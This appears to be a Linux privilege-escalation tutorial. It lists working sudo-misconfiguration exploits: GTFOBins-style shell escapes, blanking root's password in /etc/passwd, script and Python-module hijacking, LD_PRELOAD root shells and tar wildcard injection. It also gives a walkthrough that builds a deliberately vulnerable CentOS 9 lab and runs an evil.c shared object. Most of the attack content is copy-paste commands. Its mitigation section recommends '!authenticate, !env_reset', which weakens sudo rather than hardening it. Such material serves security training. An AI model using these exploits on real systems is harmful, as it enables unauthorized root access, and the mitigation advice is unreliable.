**Elevating Privilege through `sudo`**

Privilege escalation through `sudo` misconfigurations occurs when a low-privileged user can execute commands with root privileges because Administrator has done incorrect `sudoers` settings and given unintended privilege to a normal user.

**To check what commands you can run with `sudo`, use:**
```
sudo -l
```
If the output shows commands that can be run as root (`(ALL) NOPASSWD:`) without a password, it may be exploitable.

**If `sudo -l` shows:**
```
(root) NOPASSWD: /bin/su
```
**You can escalate privileges with:**
```
sudo su
```

**If `sudo -l` allows:**
```
(root) NOPASSWD: /bin/bash
```
**You can get a root shell:**
```
sudo -i
```
**or**
```
sudo /bin/bash
```

**If `sudo` allows executing an unrestricted binary like `vim`, `awk`, or `python`, you can escalate privileges:**
```
sudo vim -c ':!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/passwd
!/bin/sh
sudo perl -e 'exec "/bin/sh";'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
More exploitable binaries can be found at **[GTFOBins](https://gtfobins.github.io/)**.

**If `sudo` allows running `nano`, `vi`, or `vim` on system files:**
```
(root) NOPASSWD: /usr/bin/nano /etc/passwd
```
**You can edit `/etc/passwd` to remove the root password:**
```
sudo nano /etc/passwd
```
**Modify the root entry:**
```
root:x:0:0:root:/root:/bin/bash
```
**to:**
```
root::0:0:root:/root:/bin/bash
```
**Save and exit, then switch to root without a password:**
```
su root
```

**If `sudo -l` allows executing a script:**
```
(root) NOPASSWD: /path/to/script.sh
```
**Modify the script:**
```
echo "/bin/bash" >> /path/to/script.sh
sudo /path/to/script.sh
```
**If you're unable to modify the script directly, you can review it to identify any imported modules or packages that might be customizable.**
For Example, if it is a python script then look for any imported package,
Once you identify the modules in use, assess whether it's possible to make changes to them. 
If you're able to modify any of the imported packages, you can introduce adjustments by adding simple lines of code within those packages, 
depending on your access level.
If it's possible to make changes, you could add a simple line of code which will edit the permissions of the '/etc/passwd' file.
```
os.system('chmod 777 /etc/passwd')
```

**If `sudo` allows running commands but does not clear environment variables:**
```
echo 'int main() { setgid(0); setuid(0); system("/bin/sh"); }' > /tmp/root.c
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /bin/bash
```

**If `sudo` allows commands like:**
```
(root) NOPASSWD: /bin/tar * 
```
**You can execute arbitrary commands:**
```
echo "id" > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
echo "sh 0<&2 1>&2" > /tmp/--checkpoint-action=exec=sh
echo "sh 0<&2 1>&2" > /tmp/--checkpoint=1
sudo tar -cf /dev/null /tmp/*
```

**To mitigate risks:
Restrict `sudoers` settings:**
  ```
  visudo
  ```
**Ensure:**
  ```
  Defaults !authenticate, !env_reset, secure_path
  ```
**Remove unnecessary `sudo` permissions:**
  ```
  sudo visudo
  ```
 **Remove lines like:**
  ```
  ALL=(ALL) NOPASSWD: ALL
  ```
And follow least privilege principles to prevent exploitation.


# LD_PRELOAD Exploitation and Privilege Escalation on CentOS 9

## Step 1: Install Apache
Run the following command to install Apache:
```bash
yum install httpd -y
```

## Step 2: Start and Enable Apache Service
Start the Apache service and enable it to run on boot:
```bash
systemctl start httpd
systemctl enable httpd
```

## Step 3: Create a User for Apache Management
Create a new user named `site-admin`:
```bash
useradd -m site-admin -s /bin/bash
```

## Step 4: Grant sudo Permissions to `site-admin`
Edit the sudoers file:
```bash
nano /etc/sudoers
```
Add the following line to grant `site-admin` permission to run Apache without a password:
```bash
site-admin  ALL=(ALL)   NOPASSWD: /usr/sbin/httpd
```

## Step 5: Set Password for `site-admin`
Use the `chpasswd` command to set the password:
```bash
echo 'site-admin:123' | chpasswd
```

## Step 6: Configuring sudoers for LD_PRELOAD Persistence
Add the following line to `/etc/sudoers` to keep the `LD_PRELOAD` environment variable:
```bash
Defaults env_keep += "LD_PRELOAD"
```

## Step 7: SSH into the Machine and Test Apache
SSH into the server as `site-admin`:
```bash
ssh site-admin@192.168.1.10
```
Run Apache commands to verify permissions:
```bash
sudo /usr/sbin/httpd
sudo /usr/sbin/httpd -v
sudo /usr/sbin/httpd -T
```

## Step 8: Exploiting LD_PRELOAD for Privilege Escalation
### Create a Malicious Shared Object (`evil.c`)
Create and save the following C code as `evil.c`:
```c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("chmod 777 /etc/passwd");
}
```

### Compile and Generate Shared Object
Compile the malicious shared object:
```bash
gcc -fPIC -shared -o /tmp/env.so /tmp/evil.c -nostartfiles
```

### Execute the Exploit
Run the following command to exploit `LD_PRELOAD`:
```bash
sudo LD_PRELOAD=/tmp/env.so /usr/sbin/httpd
```

## Step 9: Locate Shared Object Files
To find shared object files on the system, use:
```bash
find /lib /lib64 /usr/lib /usr/lib64 -name "*.so*"
```

---
This guide covers Apache installation, user management, sudo permissions, and an LD_PRELOAD privilege escalation exploit on CentOS 9. Ensure that security measures are in place to prevent unauthorized privilege escalation.



